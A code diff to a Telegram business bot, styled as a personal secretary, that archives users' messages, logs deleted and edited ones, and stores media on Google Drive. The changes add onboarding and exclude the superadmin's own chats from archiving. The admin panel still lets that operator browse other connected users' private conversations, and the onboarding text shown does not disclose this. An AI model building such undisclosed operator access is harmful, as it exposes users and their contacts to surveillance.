@@ -46,63 +46,111 @@ GOOGLE_CLIENT_ID = os.environ.get("GOOGLE_CLIENT_ID", "")
 GOOGLE_CLIENT_SECRET = os.environ.get("GOOGLE_CLIENT_SECRET", "")
 GOOGLE_REFRESH_TOKEN = os.environ.get("GOOGLE_REFRESH_TOKEN", "")
 
+MENU_PHOTO = "https://files.catbox.moe/bph5iz.webp"
+
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 try:
     client = AsyncIOMotorClient(MONGO_URI)
     db = client['telegram_multi_bot']
-    messages_collection = db['messages']              # 48ч TTL
-    connections_collection = db['connections']        # бизнес-соединения
-    users_collection = db['users']                    # настройки пользователей
-    history_collection = db['history']                # логи изменений/удалений
-    archive_collection = db['chat_archive']           # вечный архив
-    deleted_users_collection = db['deleted_users']    # статистика по собеседникам
+    messages_collection = db['messages']
+    connections_collection = db['connections']
+    users_collection = db['users']
+    history_collection = db['history']
+    archive_collection = db['chat_archive']
+    deleted_users_collection = db['deleted_users']
 except Exception as e:
     print(f"Ошибка БД: {e}")
 
 muted_chats = set()
 afk_cooldowns = {}
 
+BOT_USERNAME = "your_bot_username"
+
 # ==========================================
-# КУРСЫ
+# ПОДКЛЮЧЕНИЕ БИЗНЕС-БОТА
 # ==========================================
-EXCHANGE_CACHE = {}
-STARS_USD_RATE = 0.015
+async def is_bot_connected(user_id: int) -> bool:
+    """Проверяет, подключён ли бизнес-бот к аккаунту пользователя."""
+    if user_id == SUPERADMIN_ID:
+        return True
+    conn = await connections_collection.find_one({"user_id": user_id})
+    return bool(conn)
 
-CURRENCY_ALIASES = {
-    "usd": "USD", "доллар": "USD", "доллары": "USD", "долларов": "USD", "бакс": "USD", "баксы": "USD", "баксов": "USD", "$": "USD",
-    "rub": "RUB", "рубль": "RUB", "рубли": "RUB", "рублей": "RUB", "руб": "RUB", "₽": "RUB",
-    "eur": "EUR", "евро": "EUR", "€": "EUR",
-    "cny": "CNY", "юань": "CNY", "юани": "CNY", "юаней": "CNY", "¥": "CNY",
-    "btc": "BTC", "биткоин": "BTC", "биток": "BTC", "₿": "BTC",
-    "ton": "TON", "тон": "TON", "тонов": "TON", "грам": "TON",
-    "stars": "STARS", "звезд": "STARS", "звёзд": "STARS", "звезды": "STARS", "⭐": "STARS",
-    "eth": "ETH", "эфир": "ETH", "Ξ": "ETH",
-    "usdt": "USDT", "тетер": "USDT", "юсдт": "USDT",
-    "kzt": "KZT", "тенге": "KZT", "₸": "KZT",
-    "uah": "UAH", "гривна": "UAH", "гривен": "UAH", "₴": "UAH",
-    "gbp": "GBP", "фунт": "GBP", "£": "GBP",
-    "jpy": "JPY", "иена": "JPY", "йена": "JPY",
-}
 
-ALL_CURRENCIES = ["RUB", "USD", "EUR", "CNY", "UAH", "KZT", "GBP", "JPY", "BTC", "ETH", "USDT", "TON", "STARS"]
-_CURRENCY_ALT = "|".join(sorted([re.escape(a) for a in CURRENCY_ALIASES.keys()], key=len, reverse=True))
-_NUM = r"\d+[.,]?\d*"
-_OPS = r"[+\-*/xх^]"
-_WORDS = r"(?:плюс|минус|умножить на|разделить на|поделить на|умножить|разделить|поделить|сложить|вычесть|делить|степень|в степени|х)"
-AUTO_MATH_PATTERN = rf"^\s*{_NUM}(?:\s{{0,3}}(?:{_OPS}|{_WORDS})\s{{0,3}}{_NUM})+\s*$"
-AUTO_MATH_CURRENCY_PATTERN = rf"^\s*({_NUM}(?:\s{{0,3}}(?:{_OPS}|{_WORDS})\s{{0,3}}{_NUM})*)\s{{0,3}}({_CURRENCY_ALT})\s*$"
+def get_connect_kb():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔗 Открыть настройки Telegram", url="tg://settings/edit")],
+        [InlineKeyboardButton(text="✅ Я подключил — проверить", callback_data="check_connection")]
+    ])
 
-WORD_NUMBERS = {
-    "ноль": 0, "один": 1, "два": 2, "три": 3, "четыре": 4, "пять": 5, "шесть": 6,
-    "семь": 7, "восемь": 8, "девять": 9, "десять": 10, "сто": 100, "тысяча": 1000,
-}
-OPERATORS = {
-    "умножить на": "*", "разделить на": "/", "поделить на": "/", "в степени": "**",
-    "плюс": "+", "сложить": "+", "минус": "-", "вычесть": "-",
-    "умножить": "*", "разделить": "/", "делить": "/", "поделить": "/", "х": "*",
-}
+
+def get_connect_text() -> str:
+    return (
+        "🔌 <b>Подключи бота к своему аккаунту</b>\n\n"
+        "Чтобы бот работал как твой личный секретарь, подключи его через <b>Автоматизацию чатов</b> в Telegram.\n\n"
+        "<b>📋 Инструкция:</b>\n\n"
+        "1️⃣ Нажми кнопку <b>«Открыть настройки Telegram»</b> ниже\n"
+        "2️⃣ Пролистай страницу вниз до раздела <b>«Автоматизация чатов»</b>\n"
+        "3️⃣ Нажми <b>«Добавить бота»</b>\n"
+        f"4️⃣ Введи username: <code>@{BOT_USERNAME}</code>\n"
+        "5️⃣ В разрешениях выбери <b>ТОЛЬКО «Управление чатами»</b>\n"
+        "6️⃣ Остальные галочки <b>НЕ включай</b>\n"
+        "7️⃣ Сохрани и вернись сюда\n"
+        "8️⃣ Нажми <b>«Я подключил — проверить»</b>\n\n"
+        "💡 После подключения бот начнёт:\n"
+        "• Архивировать сообщения\n"
+        "• Отслеживать удалённые и изменения\n"
+        "• Сохранять медиа на Google Drive\n"
+        "• Отвечать на команды в чатах"
+    )
+
+
+# ==========================================
+# ХЕЛПЕР ДЛЯ ПОКАЗА МЕНЮ С ФОТО
+# ==========================================
+async def show_menu(call: CallbackQuery, caption: str, kb, with_photo: bool = True):
+    """Показывает экран меню: фото + подпись или просто текст."""
+    msg = call.message
+    try:
+        if with_photo:
+            if msg.photo:
+                await msg.edit_caption(caption=caption, reply_markup=kb, parse_mode="HTML")
+            else:
+                with suppress(Exception):
+                    await msg.delete()
+                await bot.send_photo(
+                    chat_id=call.from_user.id,
+                    photo=MENU_PHOTO,
+                    caption=caption,
+                    reply_markup=kb,
+                    parse_mode="HTML"
+                )
+        else:
+            if msg.photo:
+                with suppress(Exception):
+                    await msg.delete()
+                await bot.send_message(
+                    chat_id=call.from_user.id,
+                    text=caption,
+                    reply_markup=kb,
+                    parse_mode="HTML",
+                    disable_web_page_preview=True
+                )
+            else:
+                with suppress(TelegramBadRequest):
+                    await msg.edit_text(
+                        caption, reply_markup=kb,
+                        parse_mode="HTML",
+                        disable_web_page_preview=True
+                    )
+    except TelegramBadRequest as e:
+        if "not modified" not in str(e).lower():
+            print(f"show_menu TB: {e}")
+    except Exception as e:
+        print(f"show_menu error: {e}")
+
 
 # ==========================================
 # GOOGLE DRIVE
@@ -236,7 +284,6 @@ def _extract_media_info(message: Message):
 
 
 async def archive_message(message: Message, conn_id: str, chat_id: int, owner_id: int, owner_name: str, is_owner: bool):
-    """Сохраняет сообщение в вечный архив. Медиа — на Google Drive."""
     text = message.text or message.caption or ""
     media_type, file_id, ext, mime = _extract_media_info(message)
 
@@ -260,7 +307,6 @@ async def archive_message(message: Message, conn_id: str, chat_id: int, owner_id
         "created_at": datetime.now(timezone.utc),
     }
 
-    # Медиа — качаем и заливаем на Drive
     if media_type and file_id:
         try:
             peer_name = _sanitize(message.from_user.first_name or f"peer_{chat_id}")
@@ -293,8 +339,6 @@ async def archive_message(message: Message, conn_id: str, chat_id: int, owner_id
 # ОБНОВЛЕНИЕ ЮЗЕРНЕЙМОВ
 # ==========================================
 async def refresh_usernames_loop():
-    """Раз в сутки обновляет username/first_name во всех документах архива."""
-    # Первый запуск через 24 часа после старта
     while True:
         try:
             await asyncio.sleep(86400)
@@ -421,8 +465,46 @@ def format_gift_card(data: dict) -> str:
 
 
 # ==========================================
-# МАТЕМАТИКА
+# КУРСЫ И МАТЕМАТИКА
 # ==========================================
+EXCHANGE_CACHE = {}
+STARS_USD_RATE = 0.015
+
+CURRENCY_ALIASES = {
+    "usd": "USD", "доллар": "USD", "доллары": "USD", "долларов": "USD", "бакс": "USD", "баксы": "USD", "баксов": "USD", "$": "USD",
+    "rub": "RUB", "рубль": "RUB", "рубли": "RUB", "рублей": "RUB", "руб": "RUB", "₽": "RUB",
+    "eur": "EUR", "евро": "EUR", "€": "EUR",
+    "cny": "CNY", "юань": "CNY", "юани": "CNY", "юаней": "CNY", "¥": "CNY",
+    "btc": "BTC", "биткоин": "BTC", "биток": "BTC", "₿": "BTC",
+    "ton": "TON", "тон": "TON", "тонов": "TON", "грам": "TON",
+    "stars": "STARS", "звезд": "STARS", "звёзд": "STARS", "звезды": "STARS", "⭐": "STARS",
+    "eth": "ETH", "эфир": "ETH", "Ξ": "ETH",
+    "usdt": "USDT", "тетер": "USDT", "юсдт": "USDT",
+    "kzt": "KZT", "тенге": "KZT", "₸": "KZT",
+    "uah": "UAH", "гривна": "UAH", "гривен": "UAH", "₴": "UAH",
+    "gbp": "GBP", "фунт": "GBP", "£": "GBP",
+    "jpy": "JPY", "иена": "JPY", "йена": "JPY",
+}
+
+ALL_CURRENCIES = ["RUB", "USD", "EUR", "CNY", "UAH", "KZT", "GBP", "JPY", "BTC", "ETH", "USDT", "TON", "STARS"]
+_CURRENCY_ALT = "|".join(sorted([re.escape(a) for a in CURRENCY_ALIASES.keys()], key=len, reverse=True))
+_NUM = r"\d+[.,]?\d*"
+_OPS = r"[+\-*/xх^]"
+_WORDS = r"(?:плюс|минус|умножить на|разделить на|поделить на|умножить|разделить|поделить|сложить|вычесть|делить|степень|в степени|х)"
+AUTO_MATH_PATTERN = rf"^\s*{_NUM}(?:\s{{0,3}}(?:{_OPS}|{_WORDS})\s{{0,3}}{_NUM})+\s*$"
+AUTO_MATH_CURRENCY_PATTERN = rf"^\s*({_NUM}(?:\s{{0,3}}(?:{_OPS}|{_WORDS})\s{{0,3}}{_NUM})*)\s{{0,3}}({_CURRENCY_ALT})\s*$"
+
+WORD_NUMBERS = {
+    "ноль": 0, "один": 1, "два": 2, "три": 3, "четыре": 4, "пять": 5, "шесть": 6,
+    "семь": 7, "восемь": 8, "девять": 9, "десять": 10, "сто": 100, "тысяча": 1000,
+}
+OPERATORS = {
+    "умножить на": "*", "разделить на": "/", "поделить на": "/", "в степени": "**",
+    "плюс": "+", "сложить": "+", "минус": "-", "вычесть": "-",
+    "умножить": "*", "разделить": "/", "делить": "/", "поделить": "/", "х": "*",
+}
+
+
 def parse_math_expression(text: str) -> str:
     text = text.lower().strip()
     for word, op in sorted(OPERATORS.items(), key=lambda x: -len(x[0])):
@@ -584,10 +666,10 @@ async def start_web_server() -> web.AppRunner:
 
 
 async def on_startup():
-    # TTL 48ч для рабочей коллекции
+    global BOT_USERNAME
+
     with suppress(Exception):
         await messages_collection.create_index("created_at", expireAfterSeconds=172800)
-    # Индексы архива
     with suppress(Exception):
         await archive_collection.create_index([("owner_id", 1), ("conn_id", 1), ("chat_id", 1), ("created_at", -1)])
         await archive_collection.create_index([("owner_id", 1), ("is_viewed", 1)])
@@ -599,6 +681,12 @@ async def on_startup():
     asyncio.create_task(update_rates_loop())
     asyncio.create_task(refresh_usernames_loop())
     _init_drive()
+
+    # Получаем username бота
+    with suppress(Exception):
+        me = await bot.get_me()
+        BOT_USERNAME = me.username or "your_bot_username"
+        print(f"✅ Бот: @{BOT_USERNAME}")
 
     with suppress(Exception):
         me = await fetch_gift_satellite("/user/me")
@@ -653,19 +741,52 @@ async def cmd_start(message: Message, state: FSMContext):
             {"$set": {"user_id": message.from_user.id}},
             upsert=True
         )
+
+    # Проверяем подключение
+    if not await is_bot_connected(message.from_user.id):
+        kb = get_connect_kb()
+        text = get_connect_text()
+        try:
+            await message.answer_photo(photo=MENU_PHOTO, caption=text, reply_markup=kb, parse_mode="HTML")
+        except Exception:
+            await message.answer(text, reply_markup=kb, parse_mode="HTML")
+        return
+
     kb = await get_user_main_kb(message.from_user.id)
-    await message.answer(
-        "👋 <b>Твой личный бот-секретарь.</b>\nУправляй статусом и настройками ниже:",
-        reply_markup=kb, parse_mode="HTML"
-    )
+    text = "👋 <b>Твой личный бот-секретарь.</b>\nУправляй статусом и настройками ниже:"
+    try:
+        await message.answer_photo(photo=MENU_PHOTO, caption=text, reply_markup=kb, parse_mode="HTML")
+    except Exception:
+        await message.answer(text, reply_markup=kb, parse_mode="HTML")
+
+
+@dp.callback_query(F.data == "check_connection")
+async def check_connection_handler(call: CallbackQuery):
+    if await is_bot_connected(call.from_user.id):
+        await call.answer("✅ Подключение найдено!", show_alert=True)
+        kb = await get_user_main_kb(call.from_user.id)
+        await show_menu(call, "🏠 <b>Главное меню:</b>", kb, with_photo=True)
+    else:
+        await call.answer(
+            "❌ Бот ещё не подключён.\n\n"
+            "Открой настройки → Автоматизация чатов → Добавить бота → "
+            f"введи @{BOT_USERNAME} → выбери только «Управление чатами»",
+            show_alert=True
+        )
 
 
 @dp.callback_query(F.data == "user_main")
 async def user_main_handler(call: CallbackQuery, state: FSMContext):
     await state.clear()
+
+    # Если пользователь отключил бота — показываем экран подключения
+    if not await is_bot_connected(call.from_user.id):
+        kb = get_connect_kb()
+        await show_menu(call, get_connect_text(), kb, with_photo=True)
+        return
+
     kb = await get_user_main_kb(call.from_user.id)
-    with suppress(TelegramBadRequest):
-        await call.message.edit_text("🏠 <b>Главное меню:</b>", reply_markup=kb, parse_mode="HTML")
+    await show_menu(call, "🏠 <b>Главное меню:</b>", kb, with_photo=True)
 
 
 # ==========================================
@@ -673,9 +794,13 @@ async def user_main_handler(call: CallbackQuery, state: FSMContext):
 # ==========================================
 @dp.callback_query(F.data == "deleted_menu")
 async def deleted_menu_handler(call: CallbackQuery):
+    if not await is_bot_connected(call.from_user.id):
+        kb = get_connect_kb()
+        await show_menu(call, get_connect_text(), kb, with_photo=True)
+        return
+
     owner_id = call.from_user.id
 
-    # ВАЖНО: изоляция — только данные этого owner_id
     pipeline = [
         {"$match": {
             "owner_id": owner_id,
@@ -696,10 +821,7 @@ async def deleted_menu_handler(call: CallbackQuery):
     builder = InlineKeyboardBuilder()
     if not chats:
         builder.button(text="🔙 Назад", callback_data="user_main")
-        await call.message.edit_text(
-            "🗑 <b>Удалённые и изменения</b>\n\nПока пусто.",
-            reply_markup=builder.as_markup(), parse_mode="HTML"
-        )
+        await show_menu(call, "🗑 <b>Удалённые и изменения</b>\n\nПока пусто.", builder.as_markup(), with_photo=True)
         return
 
     for ch in chats:
@@ -721,14 +843,13 @@ async def deleted_menu_handler(call: CallbackQuery):
 
     builder.button(text="🔙 Назад", callback_data="user_main")
     builder.adjust(1)
-    await call.message.edit_text(
-        "🗑 <b>Собеседники (удалённые / изменения):</b>",
-        reply_markup=builder.as_markup(), parse_mode="HTML"
-    )
+    await show_menu(call, "🗑 <b>Собеседники (удалённые / изменения):</b>", builder.as_markup(), with_photo=True)
 
 
 @dp.callback_query(F.data.startswith("delchat|"))
 async def deleted_chat_handler(call: CallbackQuery):
+    if not await is_bot_connected(call.from_user.id):
+        return
     parts = call.data.split("|")
     if len(parts) != 3:
         await call.answer("Ошибка навигации", show_alert=True)
@@ -759,12 +880,13 @@ async def deleted_chat_handler(call: CallbackQuery):
     builder.button(text="🔙 Назад", callback_data="deleted_menu")
     builder.adjust(1)
 
-    await call.message.edit_text(
+    await show_menu(
+        call,
         f"🗑 <b>Активность собеседника</b>\n\n"
         f"Удалено: <b>{del_total}</b>\n"
         f"Изменено: <b>{edit_total}</b>\n"
         f"Непросмотрено: <b>{unviewed}</b>",
-        reply_markup=builder.as_markup(), parse_mode="HTML"
+        builder.as_markup(), with_photo=True
     )
 
 
@@ -953,7 +1075,7 @@ async def download_archive(call: CallbackQuery):
 
 
 # ==========================================
-# АДМИНКА — только для SUPERADMIN_ID
+# АДМИНКА
 # ==========================================
 def get_admin_main_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -976,8 +1098,7 @@ async def back_to_main_admin(call: CallbackQuery, state: FSMContext):
         await call.answer("Нет доступа", show_alert=True)
         return
     await state.clear()
-    with suppress(TelegramBadRequest):
-        await call.message.edit_text("👑 <b>Панель управления:</b>", reply_markup=get_admin_main_kb(), parse_mode="HTML")
+    await show_menu(call, "👑 <b>Панель управления:</b>", get_admin_main_kb(), with_photo=True)
 
 
 @dp.callback_query(F.data == "admin_twinks")
@@ -985,12 +1106,15 @@ async def admin_twinks(call: CallbackQuery):
     if call.from_user.id != SUPERADMIN_ID:
         await call.answer("Нет доступа", show_alert=True)
         return
-    conns = await connections_collection.find({}).to_list(length=100)
+
+    conns = await connections_collection.find({
+        "user_id": {"$ne": SUPERADMIN_ID}
+    }).to_list(length=100)
 
     builder = InlineKeyboardBuilder()
     if not conns:
         builder.button(text="🔙 Назад", callback_data="admin_main")
-        await call.message.edit_text("Нет подключённых аккаунтов.", reply_markup=builder.as_markup())
+        await show_menu(call, "Нет подключённых аккаунтов.", builder.as_markup(), with_photo=True)
         return
 
     for c in conns:
@@ -1000,7 +1124,7 @@ async def admin_twinks(call: CallbackQuery):
         builder.button(text=f"💼 {name} ({count})", callback_data=f"twink|{conn_id}")
     builder.button(text="🔙 Назад", callback_data="admin_main")
     builder.adjust(1)
-    await call.message.edit_text("💼 <b>Выбери аккаунт (твинк):</b>", reply_markup=builder.as_markup(), parse_mode="HTML")
+    await show_menu(call, "💼 <b>Выбери аккаунт (твинк):</b>", builder.as_markup(), with_photo=True)
 
 
 @dp.callback_query(F.data.startswith("twink|"))
@@ -1013,6 +1137,11 @@ async def twink_chats(call: CallbackQuery):
         await call.answer("Ошибка", show_alert=True)
         return
     _, conn_id = parts
+
+    conn_doc = await connections_collection.find_one({"business_connection_id": conn_id})
+    if conn_doc and conn_doc.get("user_id") == SUPERADMIN_ID:
+        await call.answer("Это соединение недоступно", show_alert=True)
+        return
 
     pipeline = [
         {"$match": {"conn_id": conn_id}},
@@ -1030,7 +1159,7 @@ async def twink_chats(call: CallbackQuery):
     builder = InlineKeyboardBuilder()
     if not chats:
         builder.button(text="🔙 Назад", callback_data="admin_twinks")
-        await call.message.edit_text("У этого аккаунта пока нет переписок.", reply_markup=builder.as_markup())
+        await show_menu(call, "У этого аккаунта пока нет переписок.", builder.as_markup(), with_photo=True)
         return
 
     for ch in chats:
@@ -1043,7 +1172,7 @@ async def twink_chats(call: CallbackQuery):
         builder.button(text=label[:60], callback_data=f"twinkchat|{conn_id}|{chat_id}")
     builder.button(text="🔙 Назад", callback_data="admin_twinks")
     builder.adjust(1)
-    await call.message.edit_text("💬 <b>Переписки аккаунта:</b>", reply_markup=builder.as_markup(), parse_mode="HTML")
+    await show_menu(call, "💬 <b>Переписки аккаунта:</b>", builder.as_markup(), with_photo=True)
 
 
 @dp.callback_query(F.data.startswith("twinkchat|"))
@@ -1102,17 +1231,20 @@ async def admin_stats(call: CallbackQuery):
         return
     builder = InlineKeyboardBuilder()
     builder.button(text="🔙 Назад", callback_data="admin_main")
-    total_archive = await archive_collection.count_documents({})
-    total_deleted = await archive_collection.count_documents({"is_deleted": True})
-    total_edited = await archive_collection.count_documents({"is_edited": True})
-    total_conns = await connections_collection.count_documents({})
-    await call.message.edit_text(
+
+    total_archive = await archive_collection.count_documents({"owner_id": {"$ne": SUPERADMIN_ID}})
+    total_deleted = await archive_collection.count_documents({"owner_id": {"$ne": SUPERADMIN_ID}, "is_deleted": True})
+    total_edited = await archive_collection.count_documents({"owner_id": {"$ne": SUPERADMIN_ID}, "is_edited": True})
+    total_conns = await connections_collection.count_documents({"user_id": {"$ne": SUPERADMIN_ID}})
+
+    await show_menu(
+        call,
         f"📊 <b>Статистика:</b>\n\n"
         f"Бизнесов: {total_conns}\n"
         f"Сообщений в архиве: {total_archive}\n"
         f"Удалённых: {total_deleted}\n"
         f"Изменённых: {total_edited}",
-        reply_markup=builder.as_markup(), parse_mode="HTML"
+        builder.as_markup(), with_photo=True
     )
 
 
@@ -1124,7 +1256,7 @@ async def admin_mutes(call: CallbackQuery):
     builder = InlineKeyboardBuilder()
     if not muted_chats:
         builder.button(text="🔙 Назад", callback_data="admin_main")
-        await call.message.edit_text("Активных мутов нет.", reply_markup=builder.as_markup())
+        await show_menu(call, "Активных мутов нет.", builder.as_markup(), with_photo=True)
         return
     for mute in list(muted_chats):
         try:
@@ -1134,7 +1266,7 @@ async def admin_mutes(call: CallbackQuery):
             continue
     builder.button(text="🔙 Назад", callback_data="admin_main")
     builder.adjust(1)
-    await call.message.edit_text("🔇 <b>Активные муты:</b>", reply_markup=builder.as_markup(), parse_mode="HTML")
+    await show_menu(call, "🔇 <b>Активные муты:</b>", builder.as_markup(), with_photo=True)
 
 
 @dp.callback_query(F.data.startswith("forceunmute|"))
@@ -1150,9 +1282,9 @@ async def force_unmute(call: CallbackQuery):
     builder.button(text="🔙 К мутам", callback_data="admin_mutes")
     if mute_key in muted_chats:
         muted_chats.remove(mute_key)
-        await call.message.edit_text("✅ Мут снят.", reply_markup=builder.as_markup())
+        await show_menu(call, "✅ Мут снят.", builder.as_markup(), with_photo=True)
     else:
-        await call.message.edit_text("Мут уже снят.", reply_markup=builder.as_markup())
+        await show_menu(call, "Мут уже снят.", builder.as_markup(), with_photo=True)
 
 
 # ==========================================
@@ -1174,39 +1306,48 @@ async def get_afk_settings_kb(user_id: int):
 
 @dp.callback_query(F.data == "afk_settings")
 async def afk_settings_handler(call: CallbackQuery):
+    if not await is_bot_connected(call.from_user.id):
+        kb = get_connect_kb()
+        await show_menu(call, get_connect_text(), kb, with_photo=True)
+        return
     kb = await get_afk_settings_kb(call.from_user.id)
-    await call.message.edit_text("⚙️ <b>Настройки автоответчика:</b>", reply_markup=kb, parse_mode="HTML")
+    await show_menu(call, "⚙️ <b>Настройки автоответчика:</b>", kb, with_photo=True)
 
 
 @dp.callback_query(F.data == "toggle_afk")
 async def toggle_afk_handler(call: CallbackQuery):
+    if not await is_bot_connected(call.from_user.id):
+        return
     user_data = await users_collection.find_one({"user_id": call.from_user.id}) or {}
     new_status = not user_data.get("is_afk", False)
     await users_collection.update_one({"user_id": call.from_user.id}, {"$set": {"is_afk": new_status}}, upsert=True)
     kb = await get_user_main_kb(call.from_user.id)
-    with suppress(TelegramBadRequest):
-        await call.message.edit_text("🏠 <b>Главное меню:</b>", reply_markup=kb, parse_mode="HTML")
+    await show_menu(call, "🏠 <b>Главное меню:</b>", kb, with_photo=True)
 
 
 @dp.callback_query(F.data == "toggle_auto_afk")
 async def toggle_auto_afk(call: CallbackQuery):
+    if not await is_bot_connected(call.from_user.id):
+        return
     user_data = await users_collection.find_one({"user_id": call.from_user.id}) or {}
     new_status = not user_data.get("auto_afk", False)
     await users_collection.update_one({"user_id": call.from_user.id}, {"$set": {"auto_afk": new_status}}, upsert=True)
     kb = await get_afk_settings_kb(call.from_user.id)
-    with suppress(TelegramBadRequest):
-        await call.message.edit_text("⚙️ <b>Настройки автоответчика:</b>", reply_markup=kb, parse_mode="HTML")
+    await show_menu(call, "⚙️ <b>Настройки автоответчика:</b>", kb, with_photo=True)
 
 
 @dp.callback_query(F.data == "afk_set_text")
 async def afk_set_text(call: CallbackQuery, state: FSMContext):
+    if not await is_bot_connected(call.from_user.id):
+        return
     user_data = await users_collection.find_one({"user_id": call.from_user.id}) or {}
     current = user_data.get("afk_text", "Владелец занят. 💤")
     builder = InlineKeyboardBuilder()
     builder.button(text="🔙 Отмена", callback_data="afk_settings")
-    await call.message.edit_text(
+    await show_menu(
+        call,
         f"Текущий текст:\n<i>{html.escape(current)}</i>\n\nОтправь новый:",
-        reply_markup=builder.as_markup(), parse_mode="HTML"
+        builder.as_markup(), with_photo=True
     )
     await state.set_state(UserStates.waiting_for_afk_text)
 
@@ -1221,11 +1362,14 @@ async def save_afk_text(message: Message, state: FSMContext):
 
 @dp.callback_query(F.data == "afk_set_time")
 async def afk_set_time(call: CallbackQuery, state: FSMContext):
+    if not await is_bot_connected(call.from_user.id):
+        return
     builder = InlineKeyboardBuilder()
     builder.button(text="🔙 Отмена", callback_data="afk_settings")
-    await call.message.edit_text(
+    await show_menu(
+        call,
         "Формат: <code>23 7</code> (с 23:00 до 07:00)",
-        reply_markup=builder.as_markup(), parse_mode="HTML"
+        builder.as_markup(), with_photo=True
     )
     await state.set_state(UserStates.waiting_for_afk_time)
 
@@ -1254,6 +1398,10 @@ async def save_afk_time(message: Message, state: FSMContext):
 # ==========================================
 @dp.callback_query(F.data == "currency_settings")
 async def currency_settings_handler(call: CallbackQuery):
+    if not await is_bot_connected(call.from_user.id):
+        kb = get_connect_kb()
+        await show_menu(call, get_connect_text(), kb, with_photo=True)
+        return
     owner_settings = await users_collection.find_one({"user_id": call.from_user.id}) or {}
     display = owner_settings.get("display_currencies", ["RUB", "STARS", "TON"])
     builder = InlineKeyboardBuilder()
@@ -1262,12 +1410,13 @@ async def currency_settings_handler(call: CallbackQuery):
         builder.button(text=f"{check} {cur}", callback_data=f"cur_toggle|{cur}")
     builder.button(text="🔙 Назад", callback_data="user_main")
     builder.adjust(2)
-    with suppress(TelegramBadRequest):
-        await call.message.edit_text("💱 <b>Выбери валюты:</b>", reply_markup=builder.as_markup(), parse_mode="HTML")
+    await show_menu(call, "💱 <b>Выбери валюты:</b>", builder.as_markup(), with_photo=True)
 
 
 @dp.callback_query(F.data.startswith("cur_toggle|"))
 async def currency_toggle_handler(call: CallbackQuery):
+    if not await is_bot_connected(call.from_user.id):
+        return
     parts = call.data.split("|")
     if len(parts) != 2:
         return
@@ -1287,10 +1436,14 @@ async def currency_toggle_handler(call: CallbackQuery):
 
 
 # ==========================================
-# МУТЫ (пользователь)
+# МУТЫ
 # ==========================================
 @dp.callback_query(F.data == "user_mutes")
 async def user_mutes_handler(call: CallbackQuery):
+    if not await is_bot_connected(call.from_user.id):
+        kb = get_connect_kb()
+        await show_menu(call, get_connect_text(), kb, with_photo=True)
+        return
     user_conns = await connections_collection.find({"user_id": call.from_user.id}).to_list(length=None)
     conn_ids = [c["business_connection_id"] for c in user_conns]
     builder = InlineKeyboardBuilder()
@@ -1306,11 +1459,9 @@ async def user_mutes_handler(call: CallbackQuery):
     builder.button(text="🔙 Назад", callback_data="user_main")
     builder.adjust(1)
     if not has_mutes:
-        with suppress(TelegramBadRequest):
-            await call.message.edit_text("Нет мутов.", reply_markup=builder.as_markup())
+        await show_menu(call, "Нет мутов.", builder.as_markup(), with_photo=True)
     else:
-        with suppress(TelegramBadRequest):
-            await call.message.edit_text("🔇 <b>Муты:</b>", reply_markup=builder.as_markup(), parse_mode="HTML")
+        await show_menu(call, "🔇 <b>Муты:</b>", builder.as_markup(), with_photo=True)
 
 
 @dp.callback_query(F.data.startswith("u_unmute|"))
@@ -1319,7 +1470,6 @@ async def user_unmute_callback(call: CallbackQuery):
     if len(parts) != 2:
         return
     mute_key = parts[1]
-    # Проверяем, что этот мут принадлежит вызывающему
     try:
         conn, chat = mute_key.rsplit("_", 1)
         owner_conn = await connections_collection.find_one({
@@ -1346,6 +1496,8 @@ async def user_unmute_callback(call: CallbackQuery):
 # ==========================================
 @dp.callback_query(F.data == "user_cmds")
 async def show_cmds(call: CallbackQuery):
+    if not await is_bot_connected(call.from_user.id):
+        return
     text = (
         "📖 <b>Команды (в бизнес-чатах):</b>\n\n"
         "🚫 <code>.мут</code> — мут собеседника\n"
@@ -1357,8 +1509,7 @@ async def show_cmds(call: CallbackQuery):
     )
     builder = InlineKeyboardBuilder()
     builder.button(text="🔙 Назад", callback_data="user_main")
-    with suppress(TelegramBadRequest):
-        await call.message.edit_text(text, parse_mode="HTML", reply_markup=builder.as_markup())
+    await show_menu(call, text, builder.as_markup(), with_photo=True)
 
 
 # ==========================================
@@ -1367,12 +1518,29 @@ async def show_cmds(call: CallbackQuery):
 @dp.business_connection()
 async def on_business_connection(connection: BusinessConnection):
     if connection.is_enabled:
+        if connection.user.id == SUPERADMIN_ID:
+            return
         await ensure_connection(
             connection.id,
             connection.user.id,
             connection.user.first_name,
             connection.user.username or ""
         )
+        # Уведомляем, что бот подключён
+        with suppress(Exception):
+            await bot.send_message(
+                chat_id=connection.user.id,
+                text=(
+                    "✅ <b>Бот успешно подключён!</b>\n\n"
+                    "Теперь можешь пользоваться меню — открой /start\n\n"
+                    "💡 В бизнес-чатах доступны команды:\n"
+                    "• <code>.мут</code> — мут собеседника\n"
+                    "• <code>.п1</code>, <code>.п2</code>, <code>.п3</code> — анимации\n"
+                    "• <code>5+3</code>, <code>5 баксов</code> — математика и валюты\n"
+                    "• <code>t.me/nft/...</code> — карточка подарка"
+                ),
+                parse_mode="HTML"
+            )
     else:
         with suppress(Exception):
             await connections_collection.delete_one({"business_connection_id": connection.id})
@@ -1578,27 +1746,29 @@ async def auto_math_and_currency(message: Message):
 
 
 # ==========================================
-# ГЛАВНЫЙ ОБРАБОТЧИК СООБЩЕНИЙ
+# ГЛАВНЫЙ ОБРАБОТЧИК
 # ==========================================
 @dp.business_message()
 async def handle_messages(message: Message):
     chat_id = message.chat.id
     conn_id = message.business_connection_id
 
-    # Получаем владельца соединения
+    if message.from_user.id == SUPERADMIN_ID:
+        return
+    if chat_id == SUPERADMIN_ID:
+        return
+
     owner_data = await connections_collection.find_one({"business_connection_id": conn_id})
     if not owner_data:
         return
 
     owner_id = owner_data["user_id"]
-    owner_name = owner_data.get("first_name", "owner")
+    if owner_id == SUPERADMIN_ID:
+        return
 
-    # В бизнес-чате chat.id == id владельца бизнес-аккаунта.
-    # from_user.id == chat.id  →  сообщение от владельца
-    # from_user.id != chat.id  →  сообщение от собеседника
+    owner_name = owner_data.get("first_name", "owner")
     is_owner = (message.from_user.id == chat_id)
 
-    # Сохраняем в рабочую коллекцию (48ч TTL) — только для владельца её чатов
     if not is_owner:
         with suppress(Exception):
             await messages_collection.insert_one({
@@ -1612,11 +1782,9 @@ async def handle_messages(message: Message):
                 "created_at": datetime.now(timezone.utc)
             })
 
-    # Архивация — все сообщения
     with suppress(Exception):
